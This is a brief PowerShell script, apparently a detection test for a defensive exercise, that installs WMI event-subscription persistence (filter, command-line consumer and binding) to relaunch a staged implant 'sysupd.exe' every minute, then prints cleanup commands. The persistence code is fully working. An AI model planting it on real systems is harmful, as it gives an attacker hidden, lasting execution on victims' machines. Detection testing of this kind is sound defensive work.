if (-not (Test-Path C:\Users\Public\sysupd.exe)) {
    Write-Warning "stage the implant first (any delivery-* walkthrough)"; exit 1
}
Write-Host "[1] creating EventFilter + CommandLineEventConsumer + binding (expect PERS-WMI-SUB)..."
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
  Name='CCDCImixFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL';
  Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_Processor' AND TargetInstance.PercentProcessorTime > 0"}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
  Name='CCDCImixConsumer'; CommandLineTemplate="C:\Users\Public\sysupd.exe"}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
  Filter=$filter; Consumer=$consumer} | Out-Null
Write-Host "trigger fires within ~60s -> implant launches -> launch chain alerts"
Write-Host "manual cleanup:"
Write-Host "  Get-WmiObject __EventFilter -Namespace root\subscription -Filter `"Name='CCDCImixFilter'`" | Remove-WmiObject"
Write-Host "  Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter `"Name='CCDCImixConsumer'`" | Remove-WmiObject"
Write-Host "  Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | ? {`$_.Filter -match 'CCDCImix'} | Remove-WmiObject"
